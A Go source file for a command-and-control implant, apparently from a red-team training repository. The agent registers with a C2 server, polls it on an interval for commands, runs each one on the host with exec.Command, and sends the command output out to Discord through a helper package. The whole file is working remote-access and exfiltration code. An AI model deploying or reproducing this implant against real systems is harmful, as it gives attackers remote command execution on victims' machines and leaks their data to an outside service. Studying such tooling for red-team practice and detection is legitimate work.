package main

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os/exec"
	"strings"
	"time"

	"github.com/sneakerhax/C2PE/Command_and_Control/async_ex_to_discord/discord"
)

var c2Server = "localhost"
var c2ServerPort = "8080"

type RegisterResponse struct {
	AgentID  string `json:"agentId"`
	Interval int    `json:"interval"`
}

func main() {
	log.SetFlags(0)

	c2Register := fmt.Sprintf("http://%s:%s/register", c2Server, c2ServerPort)
	registerResp, err := http.Get(c2Register)

	if err != nil {
		log.Fatal(err)
	}

	body, err := io.ReadAll(registerResp.Body)
	registerResp.Body.Close()
	var registerResponse RegisterResponse
	err = json.Unmarshal(body, &registerResponse)
	if err != nil {
		log.Fatal(err)
	}

	agentID := registerResponse.AgentID
	interval := registerResponse.Interval
	fmt.Printf("[*] Agent ID: %s\n", agentID)
	fmt.Printf("[*] Interval: %d\n", interval)
	for {
		fmt.Printf("[*] Sleeping for %v seconds\n", interval)
		time.Sleep(time.Duration(interval) * time.Second)
		data := url.Values{
			"agentId": {agentID},
		}
		c2Execute := fmt.Sprintf("http://%s:%s/execute", c2Server, c2ServerPort)
		executeResponse, err := http.PostForm(c2Execute, data)

		if err != nil {
			log.Printf("[-] Error fetching command: %s", err)
			continue
		}

		command, err := io.ReadAll(executeResponse.Body)
		executeResponse.Body.Close()
		if err != nil {
			log.Printf("[-] Error reading command response: %s", err)
			continue
		}

		cmdStr := string(command)
		if cmdStr == "no commands found" {
			log.Println("[-] No command to run")
			continue
		}

		if cmdStr == "exit" {
			deregisterData := url.Values{"agentId": {agentID}}
			resp, err := http.PostForm(fmt.Sprintf("http://%s:%s/deregister", c2Server, c2ServerPort), deregisterData)
			if err == nil {
				resp.Body.Close()
			}
			log.Println("[*] Deregistered and exiting")
			return
		}

		fmt.Printf("[+] Running command: %s\n", cmdStr)
		commandClean := strings.Replace(cmdStr, "\n", "", -1)
		commandArray := strings.Fields(commandClean)
		if len(commandArray) == 0 {
			log.Println("[-] Empty command received")
			continue
		}
		cmd := exec.Command(commandArray[0], commandArray[1:]...)
		output, err := cmd.Output()
		if err != nil {
			if exitErr, ok := err.(*exec.ExitError); ok {
				output = exitErr.Stderr
			}
			log.Printf("[-] Error running command: %s", err)
		}
		discord.SendToDiscord(agentID, cmdStr, string(output))
	}
}
